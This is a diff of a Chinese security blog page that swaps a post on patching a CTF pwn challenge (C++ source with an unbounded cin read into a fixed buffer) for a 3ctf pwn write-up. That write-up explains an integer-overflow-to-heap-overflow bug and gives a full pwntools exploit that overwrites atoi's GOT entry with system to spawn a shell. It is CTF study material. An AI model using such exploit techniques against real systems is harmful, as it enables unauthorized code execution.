@@ -57,18 +57,20 @@
 
 
 
-  <meta name="description" content="#修复部分题目出现的麻烦就是出现了gets危险函数，所以把gets危险函数去除，换成fgets或换成c++的cin即可，甚至可以加个cannary保护，因为题目本身没泄露，所以没法泄露cannary，所以溢出都不行了，cannary保护我也不记得命令，玩蛇皮，不给百度123456789101112131415161718192021222324252627282930313233343536373">
-<meta name="keywords" content="pwn， 栈">
+  <meta name="description" content="3ctf pwn writeup唯一一道pwn题漏洞点emm，打比赛的时候没看出，整数溢出，然后这里就可以堆溢出了漏洞利用buf是一开头就申请的，0x200字节大小，所以read(0, buf, size)的时候size整数溢出的话就可以无限溢出。溢出覆盖好多个chunk，这里攻击第一个fastbin就可以了，改他的结构体指针，然后改atoi就行了">
+<meta name="keywords" content="二进制,pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="国赛pwn修复1">
-<meta property="og:url" content="https:&#x2F;&#x2F;noone-hub.github.io&#x2F;posts&#x2F;ce5ca923&#x2F;index.html">
+<meta property="og:title" content="3ctf复赛wp">
+<meta property="og:url" content="https:&#x2F;&#x2F;noone-hub.github.io&#x2F;posts&#x2F;28402fba&#x2F;index.html">
 <meta property="og:site_name" content="NoOne-hub">
-<meta property="og:description" content="#修复部分题目出现的麻烦就是出现了gets危险函数，所以把gets危险函数去除，换成fgets或换成c++的cin即可，甚至可以加个cannary保护，因为题目本身没泄露，所以没法泄露cannary，所以溢出都不行了，cannary保护我也不记得命令，玩蛇皮，不给百度123456789101112131415161718192021222324252627282930313233343536373">
+<meta property="og:description" content="3ctf pwn writeup唯一一道pwn题漏洞点emm，打比赛的时候没看出，整数溢出，然后这里就可以堆溢出了漏洞利用buf是一开头就申请的，0x200字节大小，所以read(0, buf, size)的时候size整数溢出的话就可以无限溢出。溢出覆盖好多个chunk，这里攻击第一个fastbin就可以了，改他的结构体指针，然后改atoi就行了">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-11-10T08:46:17.099Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;NoOne-hub&#x2F;picture&#x2F;master&#x2F;img&#x2F;20191114225309.png">
+<meta property="og:updated_time" content="2019-11-14T14:55:13.175Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;NoOne-hub&#x2F;picture&#x2F;master&#x2F;img&#x2F;20191114225309.png">
 
-<link rel="canonical" href="https://noone-hub.github.io/posts/ce5ca923/">
+<link rel="canonical" href="https://noone-hub.github.io/posts/28402fba/">
 
 
 <script id="page-configurations">
@@ -83,7 +85,7 @@
 </script>
 
 
-  <title>国赛pwn修复1 | NoOne-hub</title>
+  <title>3ctf复赛wp | NoOne-hub</title>
   
 
 
@@ -224,7 +226,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/posts/ce5ca923/">
+    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/posts/28402fba/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/photo.jpg">
@@ -237,7 +239,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          国赛pwn修复1
+          3ctf复赛wp
         </h2>
 
         <div class="post-meta">
@@ -246,42 +248,13 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2019-08-25 03:14:30" itemprop="dateCreated datePublished" datetime="2019-08-25T03:14:30+08:00">2019-08-25</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-11-10 16:46:17" itemprop="dateModified" datetime="2019-11-10T16:46:17+08:00">2019-11-10</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/bin/" itemprop="url" rel="index">
-                    <span itemprop="name">bin</span>
-                  </a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/bin/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/bin/pwn/%E6%A0%88/" itemprop="url" rel="index">
-                    <span itemprop="name">栈</span>
-                  </a>
-                </span>
+              <time title="Created: 2019-11-14 22:39:24 / Modified: 22:55:13" itemprop="dateCreated datePublished" datetime="2019-11-14T22:39:24+08:00">2019-11-14</time>
             </span>
 
           
-            <span id="/posts/ce5ca923/" class="post-meta-item leancloud_visitors" data-flag-title="国赛pwn修复1" title="Views">
+            <span id="/posts/28402fba/" class="post-meta-item leancloud_visitors" data-flag-title="3ctf复赛wp" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -296,8 +269,8 @@
       </span>
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/posts/ce5ca923/#comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/posts/ce5ca923/" itemprop="commentCount"></span>
+    <a title="valine" href="/posts/28402fba/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/28402fba/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -307,7 +280,7 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>1.7k</span>
+              <span>2.4k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
@@ -326,11 +299,12 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>#修复部分</p><p>题目出现的麻烦就是出现了gets危险函数，所以把gets危险函数去除，换成fgets或换成c++的cin即可，甚至可以加个cannary保护，因为题目本身没泄露，所以没法泄露cannary，所以溢出都不行了，cannary保护我也不记得命令，玩蛇皮，不给百度</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"===================================================================="</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"1.Encrypt"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"2.Decrypt"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"3.Exit"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Input your choice!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">48</span>];</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Input your Plaintext to be encrypted"</span>);</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">    <span class="keyword">while</span>( <span class="built_in">strlen</span>(s) &gt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span>)</span><br><span class="line">                    s[x] ^= <span class="number">0xf</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                s[x] ^= <span class="number">14</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            s[x] ^= <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++x;</span><br><span class="line">    &#125;</span><br><span class="line">    s[<span class="number">47</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Ciphertext"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> input;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEEEE                            hh      iii                "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"===================================================================="</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to this Encryption machine\n"</span>);</span><br><span class="line">    begin();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            fflush(<span class="number">0</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="keyword">if</span>(input != <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"I think you can do it by yourself"</span>);</span><br><span class="line">            begin();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(input == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( input != <span class="number">1</span>  )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        encrypt();</span><br><span class="line">        begin();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something Wrong!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>
+        <h1 id="3ctf-pwn-writeup"><a href="#3ctf-pwn-writeup" class="headerlink" title="3ctf pwn writeup"></a>3ctf pwn writeup</h1><h2 id="唯一一道pwn题"><a href="#唯一一道pwn题" class="headerlink" title="唯一一道pwn题"></a>唯一一道pwn题</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114225309.png" alt></p><p>emm，打比赛的时候没看出，整数溢出，然后这里就可以堆溢出了</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>buf是一开头就申请的，0x200字节大小，所以read(0, buf, size)的时候size整数溢出的话就可以无限溢出。溢出覆盖好多个chunk，这里攻击第一个fastbin就可以了，改他的结构体指针，然后改atoi就行了</p><a id="more"></a>
 
 
-<p>手写了一遍代码，将gets危险函数替换掉了，其余没什么问题，这个比赛真心好，不让百度。。。。我很多函数都不会，没法查。。后面只能放弃。。</p>
-<p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/ce5ca923/">https://noone-hub.github.io/posts/ce5ca923/</a> <br><strong>版权声明</strong>：转载请注明出处！</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.lZOfZFQz3p/92226e82'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Input your choice:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content, encode=False)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"please input the size of secret\n"</span>, str(size))</span><br><span class="line">    sla(<span class="string">"Do you want encode(0) or decode(1) your secret ?"</span>, <span class="string">"0"</span> <span class="keyword">if</span> encode <span class="keyword">else</span> <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"please input your secret:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sa(<span class="string">":\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x200</span>, base(<span class="string">"1"</span>*<span class="number">0x58</span>))     </span><br><span class="line">    new(<span class="number">0x200</span>, base(<span class="string">"2"</span>*<span class="number">0x58</span>))     </span><br><span class="line">    new(<span class="number">0x200</span>, base(<span class="string">"3"</span>*<span class="number">0x58</span>))</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="string">'\x00'</span>*<span class="number">0x208</span>,</span><br><span class="line">        <span class="number">0x21</span>,</span><br><span class="line">        <span class="number">0x5b</span>,</span><br><span class="line">        elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">-1</span>, payload, <span class="literal">True</span>)     </span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">"your secret is:\n"</span>)</span><br><span class="line">    libc.address = uu64(r(<span class="number">6</span>)) - libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">    lg(<span class="string">"libc_address"</span>, libc.address)</span><br><span class="line">    system = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    edit(<span class="number">0</span>, p64(system))</span><br><span class="line">    sla(<span class="string">"choice:"</span>, str(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">" size of secret\n"</span>)</span><br><span class="line">    s(<span class="string">"sh\x00\x00"</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a> <br><strong>版权声明</strong>：转载请注明出处！</p>
 
     </div>
 
@@ -346,24 +320,22 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/pwn%EF%BC%8C-%E6%A0%88/" rel="tag"># pwn， 栈</a>
+              <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" rel="tag"># 二进制</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
-                <a href="/posts/5755f899/" rel="next" title="国赛pwn修复2">
-                  <i class="fa fa-chevron-left"></i> 国赛pwn修复2
+                <a href="/posts/c820405f/" rel="next" title="湖湘杯练习赛">
+                  <i class="fa fa-chevron-left"></i> 湖湘杯练习赛
                 </a>
             </div>
 
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-                <a href="/posts/2bb7fa87/" rel="prev" title="国赛pwn01">
-                  国赛pwn01 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
       </footer>
@@ -403,6 +375,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#3ctf-pwn-writeup"><span class="nav-number">1.</span> <span class="nav-text">3ctf pwn writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#唯一一道pwn题"><span class="nav-number">1.1.</span> <span class="nav-text">唯一一道pwn题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞点"><span class="nav-number">1.1.1.</span> <span class="nav-text">漏洞点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.1.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.1.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
